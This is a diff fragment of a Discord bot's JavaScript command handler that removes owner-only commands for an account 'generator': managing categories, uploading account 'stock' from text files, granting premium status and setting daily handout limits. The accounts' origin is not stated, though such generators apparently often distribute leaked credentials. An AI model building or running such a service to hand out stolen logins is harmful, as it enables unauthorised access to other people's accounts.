-      const lines = cats.map(c => `**${c}** — ${counts[c] || 0}`);
-      return respond({ embeds: [infoEmbed("Stock", lines.join("\n"))] });
-    }
-
-    // ── Owner gen admin ──
-    else if (cmd === "gencatadd") {
-      if (!isOwner(message.author.id)) return respond({ embeds: [ownerOnlyEmbed(".gencatadd")] });
-      const name = args[0];
-      if (!name) return respond({ embeds: [infoEmbed("Usage", "`.gencatadd <name>`")] });
-      const ok = gen.addCategory(name);
-      return respond({ embeds: [ok ? successEmbed(`Category \`${name}\` added.`) : errorEmbed("Category already exists.")] });
-    }
-    else if (cmd === "gencatremove") {
-      if (!isOwner(message.author.id)) return respond({ embeds: [ownerOnlyEmbed(".gencatremove")] });
-      const name = args[0];
-      if (!name) return respond({ embeds: [infoEmbed("Usage", "`.gencatremove <name>`")] });
-      const ok = gen.removeCategory(name);
-      return respond({ embeds: [ok ? successEmbed(`Removed \`${name}\`.`) : errorEmbed("Category not found.")] });
-    }
-    else if (cmd === "stockadd") {
-      if (!isOwner(message.author.id)) return respond({ embeds: [ownerOnlyEmbed(".stockadd")] });
-      const cat = args.shift();
-      if (!cat) return respond({ embeds: [infoEmbed("Usage", "`.stockadd <category>` + attach a `.txt` of accounts (one per line).")] });
-      if (!gen.categoryExists(cat)) return respond({ embeds: [errorEmbed(`Category not found: \`${cat}\``)] });
-      const attachment = message.attachments.first();
-      let lines = args.join(" ").split(/[\n,]+/).map(s => s.trim()).filter(Boolean);
-      if (attachment) {
-        const fileLines = await fetchAttachmentLines(attachment);
-        lines = lines.concat(fileLines);
-      }
-      if (lines.length === 0) return respond({ embeds: [errorEmbed("No stock provided. Attach a `.txt` file or paste lines.")] });
-      const added = gen.addStock(cat, lines);
-      return respond({ embeds: [successEmbed(`Added ${added} item(s) to \`${cat}\`. Total now: ${gen.stockCount(cat)}.`)] });
-    }
-    else if (cmd === "stockclear") {
-      if (!isOwner(message.author.id)) return respond({ embeds: [ownerOnlyEmbed(".stockclear")] });
-      const cat = args[0];
-      if (!cat) return respond({ embeds: [infoEmbed("Usage", "`.stockclear <category>`")] });
-      const ok = gen.clearStock(cat);
-      return respond({ embeds: [ok ? successEmbed(`Cleared stock for \`${cat}\`.`) : errorEmbed("Category not found.")] });
-    }
-    else if (cmd === "premiumadd") {
-      if (!isOwner(message.author.id)) return respond({ embeds: [ownerOnlyEmbed(".premiumadd")] });
-      const id = (args[0] || "").replace(/[<@!>]/g, "");
-      if (!id) return respond({ embeds: [infoEmbed("Usage", "`.premiumadd <userId>`")] });
-      gen.addPremium(id);
-      return respond({ embeds: [successEmbed(`<@${id}> is now premium (${gen.premiumLimit}/day).`)] });
-    }
-    else if (cmd === "premiumremove") {
-      if (!isOwner(message.author.id)) return respond({ embeds: [ownerOnlyEmbed(".premiumremove")] });
-      const id = (args[0] || "").replace(/[<@!>]/g, "");
-      if (!id) return respond({ embeds: [infoEmbed("Usage", "`.premiumremove <userId>`")] });
-      gen.removePremium(id);
-      return respond({ embeds: [successEmbed(`<@${id}> removed from premium.`)] });
-    }
-    else if (cmd === "genlimit") {
-      if (!isOwner(message.author.id)) return respond({ embeds: [ownerOnlyEmbed(".genlimit")] });
-      const tier = (args[0] || "").toLowerCase();
-      const n = parseInt(args[1], 10);
-      if (!["free", "premium"].includes(tier) || !Number.isFinite(n) || n < 0) {
-        return respond({ embeds: [infoEmbed("Usage", "`.genlimit free|premium <number>`")] });
-      }
-      if (tier === "free") gen.setFreeLimit(n); else gen.setPremiumLimit(n);
-      return respond({ embeds: [successEmbed(`Set ${tier} daily limit to ${n}.`)] });
-    }
-
   } catch (err) {
     console.error(`Prefix command error [${cmd}]:`, err);
     try { await respond({ embeds: [errorEmbed(err.message)] }); } catch {}
